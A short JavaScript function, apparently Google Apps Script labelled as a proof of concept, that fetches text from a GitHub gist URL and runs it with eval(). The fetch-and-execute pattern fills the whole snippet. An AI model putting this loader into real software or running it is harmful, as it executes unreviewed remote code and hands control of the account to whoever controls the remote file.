function execRemoteScript() {
    const remote_script_url = "https://gist.githubusercontent.com/lucasduete/c4c59dc0fe300ca1e9b2456bc75253b8/raw/59a26b19a84e3fcd798e21d56b22162cd6184127/poc%2520-%2520remote%2520script";

    const remote_script = UrlFetchApp.fetch(remote_script_url).getContentText();

    eval(remote_script);
}